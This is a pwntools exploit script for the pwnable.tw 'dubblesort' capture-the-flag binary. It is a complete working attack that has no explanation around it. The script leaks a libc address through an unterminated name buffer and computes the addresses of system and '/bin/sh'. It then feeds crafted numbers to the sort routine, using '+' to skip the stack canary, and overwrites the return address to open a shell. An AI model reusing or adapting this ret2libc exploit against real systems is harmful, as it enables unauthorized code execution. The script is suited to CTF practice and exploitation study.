from pwn import *

p = process("./dubblesort")
#p = remote("chall.pwnable.tw", 10101)

namePad = 24
p.sendlineafter('What your name :', 'A'*namePad)
p.recvuntil('A'*namePad)
leak = u32(p.recv(4))
leak = leak - 0x0a
success('leaked = ' + hex(leak))
offset = 0xf7fa5000 - 0xf7dcb000 #locale = 1da000 .got.plt
#offset = 0x1b0000 #server
success('Offset = ' + hex(offset))
addr_libc = leak - offset
success('libc_start = ' + hex(addr_libc))
system_addr = addr_libc + 0x3e9e0
bin_sh_addr = addr_libc + 0x17eaaa
#system_addr = addr_libc + 0x3a940 #SERVER
#bin_sh_addr = addr_libc + 0x158e8b #SERVER
success('system_addr = ' + hex(system_addr))
success('bin_sh_addr = ' + hex(bin_sh_addr))

with log.progress('Getting shell...') as t:
	p.sendlineafter('How many numbers do you what to sort :', '35')
	for x in range(24):
		p.sendlineafter(': ', '1', 15)
	p.sendlineafter(': ', '+')
	for x in range(8):
		p.sendlineafter(': ', str(system_addr), 15)
	for x in range(2):
		p.sendlineafter(': ', str(bin_sh_addr), 15)
p.interactive()